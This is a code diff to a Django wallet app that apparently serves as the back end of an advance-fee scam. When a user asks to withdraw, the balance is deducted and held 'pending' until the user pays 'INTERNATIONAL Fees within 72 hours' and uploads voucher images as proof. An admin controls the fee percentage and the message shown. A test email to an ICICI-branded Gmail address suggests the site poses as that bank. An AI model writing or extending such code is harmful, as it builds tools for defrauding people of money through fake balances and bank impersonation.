@@ -4,6 +4,19 @@ from django.contrib.auth.decorators import login_required
 from wallet.models import Wallet  # change to your actual wallet model path
 from django.contrib.auth import get_user_model
 User = get_user_model()
+from django.core.mail import send_mail
+
+@login_required
+def test_email(request):
+    send_mail(
+        'Test Email',
+        'This is a test email.',
+        'your_email@gmail.com',
+        ['icicibankweb@gmail.com'],
+        fail_silently=False,
+    )
+    messages.success(request, "Email sent successfully.")
+    return redirect('home')  # replace with your actual home route
 
 
 @login_required
@@ -16,7 +29,7 @@ from django.shortcuts import render, redirect
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
 from .models import Transaction
-from .forms import BankWithdrawForm
+from .forms import BankWithdrawForm, CardWithdrawForm
 
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render, redirect
@@ -39,12 +52,12 @@ def withdraw_bank(request):
             account_number = form.cleaned_data['account_number']
             account_holder = form.cleaned_data['account_holder']
 
-            # ✅ Check if user has enough PayPal balance
+            # Check if user has enough PayPal balance
             if wallet.paypal_balance < amount:
                 messages.error(request, "Insufficient funds for withdrawal.")
                 return render(request, 'transactions/withdraw_bank.html', {'form': form, 'wallet': wallet})
 
-            # ✅ Deduct temporarily and mark pending
+            # Deduct temporarily and mark pending
             wallet.paypal_balance -= amount
             wallet.save()
 
@@ -66,6 +79,44 @@ def withdraw_bank(request):
 
     return render(request, 'transactions/withdraw_bank.html', {'form': form, 'wallet': wallet})
 
+
+@login_required
+def withdraw_card(request):
+    user = request.user
+    wallet, _ = Wallet.objects.get_or_create(user=user)
+
+    if request.method == "POST":
+        form = CardWithdrawForm(request.POST)
+        if form.is_valid():
+            amount = form.cleaned_data['amount']
+            card_brand = form.cleaned_data['card_brand']
+            card_last4 = form.cleaned_data['card_last4']
+            card_holder = form.cleaned_data['card_holder']
+
+            if wallet.paypal_balance < amount:
+                messages.error(request, "Insufficient funds for withdrawal.")
+                return render(request, 'transactions/withdraw_card.html', {'form': form, 'wallet': wallet})
+
+            wallet.paypal_balance -= amount
+            wallet.save()
+
+            transaction = Transaction.objects.create(
+                user=user,
+                tx_type='WITHDRAW',
+                amount=amount,
+                status='PENDING',
+                description="Withdrawal to card pending. Please pay INTERNATIONAL Fees within 72 hours.",
+                card_brand=card_brand,
+                card_last4=card_last4,
+                card_holder=card_holder,
+            )
+
+            messages.info(request, "Card withdrawal request submitted. Please pay INTERNATIONAL Fees within 72 hours for processing.")
+            return redirect('transactions:withdrawal_pending', tx_id=transaction.id)
+    else:
+        form = CardWithdrawForm()
+
+    return render(request, 'transactions/withdraw_card.html', {'form': form, 'wallet': wallet})
 
 from transactions.models import Transaction, Notification
 
@@ -116,7 +167,7 @@ def withdraw_user(request):
         recipient_wallet.paypal_balance += amount
         recipient_wallet.save()
 
-        # ✅ Log transactions
+        # Log transactions
         Transaction.objects.create(
             user=request.user,
             tx_type='TRANSFER',
@@ -133,10 +184,10 @@ def withdraw_user(request):
             description=f"Received ${amount} from {request.user.email}"
         )
 
-        # ✅ Create notification for recipient
+        # Create notification for recipient
         Notification.objects.create(
             user=recipient,
-            message=f"💰 You received ${amount:.2f} from {request.user.email}."
+            message=f" You received ${amount:.2f} from {request.user.email}."
         )
 
         messages.success(request, f"Successfully transferred ${amount:.2f} to {email}.")
@@ -164,20 +215,20 @@ def decline_withdrawal(request, tx_id):
 
     if transaction.tx_type == 'WITHDRAW' and transaction.status == 'PENDING':
         try:
-            # ✅ Fetch user's wallet
+            # Fetch user's wallet
             wallet = transaction.user.wallet
             wallet.paypal_balance += transaction.amount
             wallet.save()
 
-            # ✅ Update transaction
+            # Update transaction
             transaction.status = 'DECLINED'
             transaction.description = "Withdrawal declined — funds refunded to wallet."
             transaction.save()
 
-            # ✅ Create notification for user
+            # Create notification for user
             Notification.objects.create(
                 user=transaction.user,
-                message=f"❌ Your withdrawal request of ${transaction.amount:.2f} has been declined by admin. Funds have been refunded to your PayPal balance."
+                message=f" Your withdrawal request of ${transaction.amount:.2f} has been declined by admin. Funds have been refunded to your PayPal balance."
             )
 
             messages.success(request, f"Withdrawal for {transaction.user.username} declined and refunded successfully.")
@@ -193,15 +244,15 @@ def approve_withdrawal(request, tx_id):
     transaction = get_object_or_404(Transaction, id=tx_id)
 
     if transaction.tx_type == 'WITHDRAW' and transaction.status == 'PENDING':
-        # ✅ Update transaction
+        # Update transaction
         transaction.status = 'COMPLETED'
         transaction.description = "Withdrawal approved and processed by admin."
         transaction.save()
 
-        # ✅ Create notification for user
+        # Create notification for user
         Notification.objects.create(
             user=transaction.user,
-            message=f"✅ Your withdrawal request of ${transaction.amount:.2f} has been approved and processed by admin. Funds should arrive in your bank account within 1-3 business days."
+            message=f" Your withdrawal request of ${transaction.amount:.2f} has been approved and processed by admin. Funds should arrive in your bank account within 1-3 business days."
         )
 
         messages.success(request, f"Withdrawal for {transaction.user.username} approved successfully.")
@@ -301,8 +352,8 @@ def request_money(request):
         Notification.objects.create(
             user=recipient,
             message=(
-                (f"💰 {request.user.email} requested ${amount:.2f} from you. {message} [request_tx:{req_tx.id}]"
-                 if message else f"💰 {request.user.email} requested ${amount:.2f} from you. [request_tx:{req_tx.id}]")
+                (f" {request.user.email} requested ${amount:.2f} from you. {message} [request_tx:{req_tx.id}]"
+                 if message else f" {request.user.email} requested ${amount:.2f} from you. [request_tx:{req_tx.id}]")
             )
         )
         
@@ -341,7 +392,13 @@ def notifications_list(request):
                             else {}
                         ))(Transaction.objects.filter(id=tx_id).only('id','tx_type','status','counterparty_id').first())
                     ))(int(m.group(1))) if m else {}
-                ))(re.search(r"\[request_tx:(\d+)\]", n.message or ''))
+                ))(re.search(r"\[request_tx:(\d+)\]", n.message or '')),
+                # If notification references an international fee transaction, expose continue url
+                **(lambda m: (
+                    (lambda tx_id: {
+                        'fee_continue_url': reverse('transactions:international_fee_page', args=[tx_id])
+                    }) (int(m.group(1))) if m else {}
+                ))(re.search(r"\[fee_tx:(\d+)\]", n.message or ''))
             }
             for n in notifications
         ]
@@ -466,6 +523,71 @@ def transfer_success(request, amount, email):
 def withdrawal_pending(request, tx_id):
     """Withdrawal pending page"""
     transaction = get_object_or_404(Transaction, id=tx_id, user=request.user)
+    if request.method == 'POST':
+        file = request.FILES.get('voucher_image')
+        if file:
+            transaction.voucher_image = file
+            transaction.save(update_fields=['voucher_image'])
+            messages.success(request, 'Voucher proof uploaded successfully. We will review and update your status shortly.')
+        else:
+            messages.warning(request, 'Please select a voucher image to upload.')
     return render(request, 'transactions/withdrawal_pending.html', {
         'transaction': transaction
     })
+
+
+@login_required
+def international_fee_page(request, tx_id):
+    """International Fee Payment Page"""
+    from django.shortcuts import get_object_or_404
+    tx = get_object_or_404(Transaction, id=tx_id, user=request.user)
+    if request.method == 'POST':
+        file = request.FILES.get('voucher_image')
+        if file:
+            tx.voucher_image = file
+            tx.save(update_fields=['voucher_image'])
+            messages.success(request, 'Voucher proof uploaded successfully. We will review and update your status shortly.')
+        else:
+            messages.warning(request, 'Please select a voucher image to upload.')
+    # Default percentage if admin hasn't set one
+    percentage = tx.international_fee_percentage
+    message = tx.international_fee_message
+    fee_notes = getattr(tx, 'fee_notes', None)
+    ordered_notes = fee_notes.order_by('-created_at') if fee_notes is not None else []
+    return render(request, 'transactions/international_fee.html', {
+        'transaction': tx,
+        'percentage': percentage,
+        'admin_message': message,
+        'fee_notes': ordered_notes,
+    })
+
+
+@login_required
+def international_fee_status(request, tx_id):
+    """Lightweight status polling endpoint to allow the fee page to update."""
+    from django.http import JsonResponse
+    from django.shortcuts import get_object_or_404
+    tx = get_object_or_404(Transaction, id=tx_id, user=request.user)
+    return JsonResponse({
+        'status': tx.international_fee_status,
+        'percentage': str(tx.international_fee_percentage) if tx.international_fee_percentage is not None else None,
+        'message': tx.international_fee_message or '',
+        'tx_status': tx.status,
+    })
+
+
+@login_required
+def test_email(request):
+    """Send a quick Gmail test message to confirm SMTP works."""
+    from django.http import JsonResponse
+    from django.conf import settings
+    from django.core.mail import send_mail
+    try:
+        subject = "ICICI Mail Test"
+        message = "This is a test message from Django email setup."
+        recipients = ["icicibankweb@gmail.com"]
+        from_email = getattr(settings, 'DEFAULT_FROM_EMAIL', settings.EMAIL_HOST_USER)
+        sent = send_mail(subject, message, from_email, recipients)
+        return JsonResponse({"ok": True, "sent": sent, "from": from_email, "to": recipients})
+    except Exception as e:
+        return JsonResponse({"ok": False, "error": str(e)}, status=500)
